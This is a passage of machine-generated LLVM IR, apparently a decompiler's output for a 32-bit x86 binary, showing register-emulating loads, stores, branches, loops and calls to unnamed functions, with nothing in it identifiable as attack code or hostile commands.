  %v3_8048a7b = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_8052050(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp139, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054af8.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp140, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b01.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8051fb0()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_8051c40(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_8052924()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp239, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
